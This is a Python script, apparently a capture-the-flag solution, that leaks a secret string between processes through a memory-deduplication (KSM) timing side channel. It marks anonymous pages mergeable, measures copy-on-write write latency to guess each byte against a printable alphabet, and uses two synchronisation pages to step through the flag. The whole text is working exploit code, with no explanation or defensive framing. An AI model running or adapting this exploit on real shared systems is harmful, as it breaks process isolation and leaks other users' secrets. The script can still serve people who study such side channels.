import mmap
from time import time_ns

printable = b"0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!\"#$%&\'()*+,-./:;<=>?@[\\]^_`{|}~ "

WAIT_KSM = 0x10000

SYNC1 = 1
SYNC2 = 2
TEST  = 3
N_ROUNDS = 5
THRESH = 60000

mm_leak = mmap.mmap(-1,0x1000, flags=0x22, prot=2)
mm_sync1 = mmap.mmap(-1,0x1000, flags=0x22, prot=2)
mm_sync2 = mmap.mmap(-1,0x1000, flags=0x22, prot=2)
mm_leak.madvise(12)
mm_sync1.madvise(12)
mm_sync2.madvise(12)

def mysleep():
    for i in range(WAIT_KSM):
        pass

def measure(mm, c):
    mm[0] = c
    mysleep()
    t_start = time_ns()
    mm[0] = TEST
    t_end = time_ns()
    return t_end - t_start


def wait_synced(mm, sync_word):
    while True:
        hits = 0
        for i in range(N_ROUNDS):
            if measure(mm, sync_word) > THRESH:
                hits += 1
        if hits == N_ROUNDS:
            break


# leaker
sync_word = 0
if FLAG == b'The flag is stored at /home/user2/flag.txt!':
    print("Starting...to leak")
    leaked_flag = ''
    for _ in range(len(FLAG)):
        hits = [0] * len(printable)
        for i in range(len(printable)):
            for _ in range(N_ROUNDS):
                if measure(mm_leak, printable[i]) > THRESH:
                    hits[i] += 1

        idx = hits.index(max(hits))
        leaked_c= chr(printable[idx])
        leaked_flag += leaked_c

        mm_sync1[0] = sync_word
        wait_synced(mm_sync2, sync_word)
        sync_word ^= 1
        print(f"Leaked {leaked_c}! Flag so far: {leaked_flag}")


else:
    for char in FLAG:
        mm_leak[0] = char
        wait_synced(mm_sync1, sync_word)
        mm_sync2[0] = sync_word
        sync_word ^= 1


EOF
